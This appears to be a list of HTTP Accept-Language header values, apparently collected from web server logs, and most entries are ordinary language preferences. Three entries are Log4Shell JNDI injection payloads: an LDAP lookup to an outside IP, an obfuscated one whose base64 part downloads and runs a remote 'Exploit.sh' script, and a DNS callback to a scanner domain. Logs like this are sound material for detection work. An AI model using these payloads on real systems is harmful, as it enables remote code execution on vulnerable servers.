${jndi:ldap://185.8.172.132:1389/a}
${lower:j}${upper:n}${lower:d}${upper:i}:${rand:om:-l}${rand:om:-d}${rand:om:-a}${rand:om:-p}://198.9${::-8}.53.25:1389/TomcatBypass/Co${::-m}mand/Base${::-6}4/d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pdC5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOyBybSAtcmYgRXhwbG9pdC5zaA==}
cn-CN,cn;q=0.5
en
en US,en;q=0.9,sv;q=0.8
en,zh-CN;q=0.9,zh;q=0.8,is;q=0.7,km;q=0.6,hmn;q=0.5,mn;q=0.4,ja;q=0.3
en,zh;q=0.1
en-AU,en;q=0.9
en-CA,en-US;q=0.7,en;q=0.3
en-EN,en;q=0.9,en-US;q=0.8,en;q=0.7
en-GB,en-US;q=0.9,en;q=0.8
en-GB,en;q=0.5
en-US
en-US,en;q=0.5
en-US,en;q=0.8,en-GB;q=0.6,fr-CA;q=0.4,fr;q=0.2
en-US,en;q=0.9
en-US,en;q=0.9,fr;q=0.8
en-US,en;q=0.9,hi;q=0.8
en-US,en;q=0.9,pl;q=0.8
en-US,en;q=0.9,ru;q=0.8
en-US,en;q=0.9,sv;q=0.8
en-US;q=0.5,en;q=0.3
en-US;q=0.6,en;q=0.4
en-gb
en-gb,en;q=0.5
en-us
en-us,en;q=0.5
en;q=0.7,en-US;q=0.3
en;q=0.8,en-US;q=0.5
en;q=0.9
en;q=0.9,en;q=0.8
fr,en;q=0.9
fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
zh-CN
zh-CN,en,*
zh-CN,zh;q=0.8
zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
zh-CN,zh;q=0.8,en;q=0.6,ko;q=0.4
zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
zh-CN,zh;q=0.9
zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,und;q=0.5,pt;q=0.4,zh-TW;q=0.3,lb;q=0.2,fr;q=0.1,ca;q=0.1,ja;q=0.1,mt;q=0.1,de;q=0.1,vi;q=0.1,pl;q=0.1,tr;q=0.1,nb;q=0.1,es;q=0.1
zh-CN,zh;q=0.9,en;q=0.8
zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
zh-CN,zh;q=0.9,en;q=0.8,is;q=0.7,km;q=0.6,hmn;q=0.5,mn;q=0.4,ja;q=0.3
zh-cn
zh-cn,en-us;q=0.5
zh_CN
{jndi:dns://204-48-20-180.acceptlanguage.scanworld.net}